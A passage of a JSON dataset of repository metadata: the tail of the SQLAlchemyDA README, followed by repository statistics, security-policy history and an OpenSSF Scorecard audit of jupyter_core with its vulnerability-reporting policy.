Firebird, Informix. However, some of these database backends\nhave not been tested with the SQLAlchemyDA, so your mileage may vary.\n\nIn addition to ZSQL support, the SQLAlchemyDA makes it possible to use the\nstandard SQLAlchemy API within a Zope context and participate in Zope\ntransactions.\n\nHowever, if you do not require ZSQL support, and only wish to call 'normal'\nSQLAlchemy APIs within Zope transactions, this package adds no value. Instead,\nyou would be better off trying out `zope.sqlalchemy`, as recommended in the\n`Zope book chapter on relational database\nconnectivity <http://docs.zope.org/zope2/zope2book/RelationalDatabases.html>`_.\n\n\nRequirements:\n-------------\n\n- Zope 4+\n- SQLAlchemy >= 0.5.0 (+ database specific low-level Python drivers)\n- z3c.sqlalchemy >= 1.5.0\n\nTesting: testfixtures are needed to run tests.\n\n\nInstallation:\n-------------\n\n- Download and install SQLAlchemy as egg or from the sources\n  from PyPI (pip sqlalchemy). See\n    \n    http://www.sqlalchemy.org\n\n    for details\n\n- Download and install z3c.sqlalchemy as egg or from the sources \n  from PyPI (pip z3c.sqlalchemy). See\n\n    https://pypi.org/project/z3c.sqlalchemy/\n\n  for details.\n\n- Unpack the archive containing SQLAlchemyDA inside the \"Products\"\n  directory of your Zope instance home.\n\n- After restarting Zope you go to the ZMI and create an instance of\n  \"SQLAlchemyDA\" (as you would create some DA instance)\n\n- Click on the new created SQLAlchemyDA instance within the ZMI\n  and configure your database connection through the \"Properties\" tab.\n  The connection parameter 'dsn' must be specified as a valid SQLAlchemy DSN \n  like\n\n         <dbschema>://<username>:<password>@<hostname>/<databasename>\n\n    Example:\n        \n        postgres://admin:123@localhost:5432/TestDB\n\n- ZSQL methods should see the new DA through the selection widget of available\n  database adapters\n\n- NOTE: you must have the low-level Python DB drivers installed in order to \n  access a particular database. See \n\n        http://www.sqlalchemy.org/docs/dbengine.html#dbengine_supported\n\n  for details.\n\n\nConfiguration of SQLAlchemyDA:\n------------------------------\n\n- 'dsn' - SQLAlchemy compliant Database Set Name (see www.sqlalchemy.org/docs)\n\n- 'transactional' - uncheck this property if you are working with a non-transactional\n   database like older versions of MySQL. Uncheck this property *only* if you see any\n   commit() related error. Otherwise leave this property checked. Changing this\n   property *requires* a Zope restart.\n\n- 'quoting_style' - affects how strings are quoted in SQL. By default 'standard' \n   quotes strings correctly. Setting the value to 'no-quote' might solve quoting issues\n   with some databases.\n\n\nUsing SQLAlchemyDA:\n-------------------\n\nSQLAlchemyDA works as a database adapter as documented within \"The Zope Book\"\n\nhttps://zope.readthedocs.io/en/latest/zopebook/RelationalDatabases.html\n\nand can be used like any other DA together with ZSQL methods.\n\n\nTested with databases:\n----------------------\n\n- Postgres 7.4, 8.0-8.2\n- SQLite 3.3.X\n- Oracle 10g\n- MySQL is *only* supported for MySQL databases with transaction support.\n  (see also z3c/sqlalchemy/README.txt)\n- MSSQL 2008\n \n\nKnown issues:\n-------------\n\n\"\"\" Database connection could not be opened ((ProgrammingError) (1064, You\nhave an error in your SQL syntax near 'COMMIT .\n\"\"\"\n\nThis bug might appear with older MySQL versions when opening/closing\nthe connections manually through the ZMI. It should not affect the\nfunctionality of SQLAlchemyDA.\n    \n\nAuthor\n------\n\nSQLAlchemyDA was written by Andreas Jung for Haufe Mediengruppe, Freiburg,\nGermany and ZOPYX Ltd. & Co. KG, Tuebingen, Germany.\n\n\nLicense\n-------\n\nSQLAlchemyDA is  licensed under the Zope Public License 2.1. \nSee LICENSE.txt.\n\n\nCredits\n-------\n\nParts of the SQLAlchemyDA V 0.3.X development has been sponsored by Wayne\nVolkmuth (renovis.com).\n\nMore recent SQLAlchemy support and maintenance sponsored by ZeOmega.com.\n",
        "num_commits": 248,
        "project_age_days": 3756,
        "project_created_at": "2014-07-18",
        "latest_updated_at": "2024-06-06",
        "latest_pushed_at": "2024-06-06",
        "num_contributors": 9,
        "num_pull": 14,
        "num_issues": 19,
        "num_opening_issue": 2,
        "project_size(kB)": 215,
        "num_stargazers": 2,
        "num_watchers": 2,
        "num_forks": 10,
        "num_subscribers": 67,
        "SecurityPolicy_created_at": "2020-10-01 12:54:56",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "73354a406601b5b932ed67429b32587d8a57cfa6",
                "url": "https://github.com/zopefoundation/.github/commit/73354a406601b5b932ed67429b32587d8a57cfa6",
                "date": "2022-02-02 06:58:30"
            },
            {
                "commit_id": "230a2bb9798705353da2e1a5178b4dfab52fc7f5",
                "url": "https://github.com/zopefoundation/.github/commit/230a2bb9798705353da2e1a5178b4dfab52fc7f5",
                "date": "2021-09-12 08:56:34"
            },
            {
                "commit_id": "7d9f3c84030087ca403d403727d1eaa801dd2fa5",
                "url": "https://github.com/zopefoundation/.github/commit/7d9f3c84030087ca403d403727d1eaa801dd2fa5",
                "date": "2020-10-02 06:43:48"
            },
            {
                "commit_id": "6404e075a3395a32fc186d66934e2677d3a4179e",
                "url": "https://github.com/zopefoundation/.github/commit/6404e075a3395a32fc186d66934e2677d3a4179e",
                "date": "2020-10-01 12:54:56"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "jupyter/jupyter_core",
        "project_url": "https://github.com/jupyter/jupyter_core",
        "SSF": {
            "date": "2024-10-29T23:17:28+07:00",
            "repo": {
                "name": "github.com/jupyter/jupyter_core",
                "commit": "fa513c1550bbd1ebcc14a4a79eb8c5d95e3e23c9"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.1,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: 'branch protection settings apply to administrators' is disable on branch 'main'",
                        "Warn: 'stale review dismissal' is disable on branch 'main'",
                        "Warn: branch 'main' does not require approvers",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: 'last push approval' is disable on branch 'main'",
                        "Warn: 'up-to-date branches' is disable on branch 'main'",
                        "Info: status check found to merge onto on branch 'main'",
                        "Info: PRs are required in order to make changes on branch 'main'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "22 out of 22 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 2/25 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: ipython contributor org/company found, mongodb contributor org/company found, mongodb-labs contributor org/company found, ipython-contrib contributor org/company found, quansight-labs contributor org/company found, jupyter-server contributor org/company found, veritone contributor org/company found, CodeJockey contributor org/company found, redux-observable contributor org/company found, scipy-conference contributor org/company found, sagemath contributor org/company found, bqplot contributor org/company found, python3statement contributor org/company found, nteract contributor org/company found, deconst contributor org/company found, binder-project contributor org/company found, 10gen contributor org/company found, RDFLib contributor org/company found, labyrinth-team contributor org/company found, python-modernize contributor org/company found, WRSC contributor org/company found, panosc-eu contributor org/company found, jupyter-incubator contributor org/company found, ucmerced contributor org/company found, xnd-project contributor org/company found, thegraphnetwork-literev contributor org/company found, jupytercon contributor org/company found, jupyter-resources contributor org/company found, howtowhale contributor org/company found, zed-industries contributor org/company found, pymad contributor org/company found, scipy-latinamerica contributor org/company found, python-organizers contributor org/company found, conda-forge contributor org/company found, heatlamp contributor org/company found, RobCoIndustries contributor org/company found, qsnake contributor org/company found, pickleshare contributor org/company found, computationalmodelling contributor org/company found, xonsh contributor org/company found, osl-incubator contributor org/company found, opensciencelabs contributor org/company found, zeromq contributor org/company found, matplotlib contributor org/company found, voila-dashboards contributor org/company found, pexpect contributor org/company found, european xfel contributor org/company found, jupyterday-atlanta-2016 contributor org/company found, cloudpipe contributor org/company found, pypa contributor org/company found, thehackerwithin contributor org/company found, binder-examples contributor org/company found, hibtc contributor org/company found, FluVigilanciaBR contributor org/company found, thegraphnetwork contributor org/company found, MeeseeksBox contributor org/company found, noteable-io contributor org/company found, runtimed contributor org/company found, OpenDataScienceLab contributor org/company found, OpenScienceLabs contributor org/company found, jovyan contributor org/company found, OpenDreamKit contributor org/company found, compmodels contributor org/company found, networkx contributor org/company found, pydata contributor org/company found, blogdown contributor org/company found, cilgroup contributor org/company found, jupyter contributor org/company found, jupyter-widgets contributor org/company found, numfocus contributor org/company found, anaconda contributor org/company found, nipy contributor org/company found, databricks contributor org/company found, BIDS contributor org/company found, apache contributor org/company found, jupyterlab contributor org/company found, AlertaDengue contributor org/company found, jupyterhealth contributor org/company found, simula research laboratory contributor org/company found, pylab contributor org/company found, h5py contributor org/company found, Maritime-Robotics-Student-Society contributor org/company found, IRkernel contributor org/company found, joommf contributor org/company found, European-XFEL contributor org/company found, machine-shop contributor org/company found, elyra-ai contributor org/company found, scientific-python contributor org/company found, deficient contributor org/company found, OpenWIM contributor org/company found, scikit-data contributor org/company found, jupyterhub contributor org/company found, southampton-python contributor org/company found, pygame contributor org/company found, CODAIT contributor org/company found, opensourcedesign contributor org/company found, BoliviaPython contributor org/company found, phosphorjs contributor org/company found, jupyter-attic contributor org/company found, gateway-experiments contributor org/company found, atom-community contributor org/company found, Carpentries-ES contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 102 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: BSD 3-Clause \"New\" or \"Revised\" License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "0 commit(s) and 1 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:47: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:59: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:73: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/downstream.yml:49: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:50: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/downstream.yml:59: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:62: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:65: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/downstream.yml:73: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:76: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:79: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:96: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/downstream.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/downstream.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/downstream.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/enforce-label.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/enforce-label.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/prep-release.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/prep-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/prep-release.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/prep-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-changelog.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/publish-changelog.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-changelog.yml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/publish-changelog.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-changelog.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/publish-changelog.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/publish-release.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-release.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/publish-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/publish-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/publish-release.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:42: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:52: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:68: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:69: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:93: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:94: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:124: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:125: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:126: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:157: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:158: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:159: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:175: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:61: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:81: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:82: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:110: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:111: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:134: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:135: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:141: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:143: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:148: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/jupyter_core/test.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/test.yml:146",
                        "Warn: pipCommand not pinned by hash: .github/workflows/test.yml:49",
                        "Info:   0 out of  21 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of  37 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   2 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 0 commits out of 22 are checked with a SAST tool"
                    ],
                    "score": 7,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/jupyter/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/jupyter/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/jupyter/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/jupyter/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact v5.7.2 not signed: https://api.github.com/repos/jupyter/jupyter_core/releases/146030102",
                        "Warn: release artifact v5.7.1 not signed: https://api.github.com/repos/jupyter/jupyter_core/releases/136191833",
                        "Warn: release artifact v5.7.0 not signed: https://api.github.com/repos/jupyter/jupyter_core/releases/135708365",
                        "Warn: release artifact v5.6.1 not signed: https://api.github.com/repos/jupyter/jupyter_core/releases/135484088",
                        "Warn: release artifact v5.6.0 not signed: https://api.github.com/repos/jupyter/jupyter_core/releases/135110578",
                        "Warn: release artifact v5.7.2 does not have provenance: https://api.github.com/repos/jupyter/jupyter_core/releases/146030102",
                        "Warn: release artifact v5.7.1 does not have provenance: https://api.github.com/repos/jupyter/jupyter_core/releases/136191833",
                        "Warn: release artifact v5.7.0 does not have provenance: https://api.github.com/repos/jupyter/jupyter_core/releases/135708365",
                        "Warn: release artifact v5.6.1 does not have provenance: https://api.github.com/repos/jupyter/jupyter_core/releases/135484088",
                        "Warn: release artifact v5.6.0 does not have provenance: https://api.github.com/repos/jupyter/jupyter_core/releases/135110578"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: jobLevel 'contents' permission set to 'write': .github/workflows/prep-release.yml:30",
                        "Warn: topLevel 'security-events' permission set to 'write': .github/workflows/codeql-analysis.yml:26",
                        "Warn: no topLevel permission defined: .github/workflows/downstream.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/enforce-label.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/prep-release.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-changelog.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-release.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/test.yml:1"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/jupyter/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "Security Policy\n\n## Reporting a Vulnerability\n\nIf you find a security vulnerability in Jupyter, please report it to security@ipython.org.\n\nSee more information in our [docs](https://jupyter.org/security).\n",
        "project_all_labels": [
            "bug",
            "dependencies",
            "docs",
            "documentation",
            "duplicate",
            "enhancement",
            "github_actions",
            "help wanted",
            "invalid",
            "maintenance",
            "needs-info",
            "python",
            "question",
            "regression",
            "sprint-friendly",
            "windows",
            "wontfix"
        ],
